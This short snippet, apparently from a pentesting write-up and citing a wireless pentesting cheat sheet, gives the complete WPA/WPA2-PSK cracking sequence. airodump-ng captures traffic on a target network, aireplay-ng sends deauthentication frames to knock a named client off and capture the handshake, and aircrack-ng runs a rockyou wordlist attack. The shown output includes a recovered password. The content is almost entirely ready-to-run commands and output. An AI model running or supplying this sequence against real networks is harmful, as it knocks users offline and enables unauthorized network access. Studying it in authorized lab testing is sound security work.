* https://github.com/V0lk3n/WirelessPentesting-CheatSheet?tab=readme-ov-file#cracking-wpawpa2-psk

```bash
sudo airodump-ng wlan0mon -c 6 -w wifi-mobile --bssid F0:9F:C2:71:22:12

sudo aireplay-ng -0 1 -a F0:9F:C2:71:22:12 -c 28:6C:07:6F:F9:44 wlan0mon
20:01:28  Waiting for beacon frame (BSSID: F0:9F:C2:71:22:12) on channel 6
20:01:29  Sending 64 directed DeAuth (code 7). STMAC: [28:6C:07:6F:F9:44] [ 0| 0 ACKs]

aircrack-ng wifi-mobile-01.cap -w /usr/share/wordlists/rockyou.txt
Reading packets, please wait...
Opening wifi-mobile-01.cap
Read 346 packets.

KEY FOUND! [ starwars1 ]
```